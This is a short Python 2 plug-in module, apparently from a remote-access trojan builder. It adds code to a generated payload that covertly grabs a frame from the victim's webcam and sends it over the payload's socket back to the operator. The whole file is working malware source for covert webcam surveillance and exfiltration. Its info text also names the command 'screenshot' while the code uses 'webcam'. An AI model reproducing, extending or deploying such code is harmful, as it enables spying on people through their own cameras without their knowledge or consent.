import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('import cv2')
        config.import_statements.append('from PIL import Image')
        config.import_statements.append('from io import BytesIO')
        config.import_statements.append('import pickle')
        config.functions.append('''
def get_image():
    camera = cv2.VideoCapture(0)
    # read is the easiest way to get a full image out of a VideoCapture object.
    retval, im = camera.read()
    del(camera)
    im = cv2.cvtColor(im, cv2.COLOR_BGR2RGB)
    return im
''')

        config.logics.append('''
            elif command == 'webcam':
                im = get_image()
                img = Image.fromarray(im)
                bytes = pickle.dumps(img)
                s.sendall('png:'+bytes)
''')

    elif option == 'info':
        print '\nName             : In-memory Webcam component' \
              '\nOS               : Windows' \
              '\nRequired Modules : PIL, cv2, io' \
              '\nCommands         : screenshot' \
              '\nDescription      : This module takes a webcam shot and stores it in-memory'
